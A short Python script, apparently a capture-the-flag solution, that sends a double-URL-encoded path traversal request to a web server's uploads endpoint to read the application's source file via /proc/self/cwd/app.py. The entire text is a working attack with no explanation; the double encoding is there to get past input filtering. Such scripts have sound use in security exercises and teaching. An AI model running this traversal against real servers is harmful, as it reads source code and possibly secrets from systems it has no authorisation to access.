import requests

from urllib.parse import quote_plus as urlencode

url='http://bycsec404.top:7003/uploads/'

filepath='../../../../../../proc/self/cwd/app.py'
filepath=urlencode(filepath)
filepath=urlencode(filepath)
r=requests.get(url+filepath)
print(r.text)

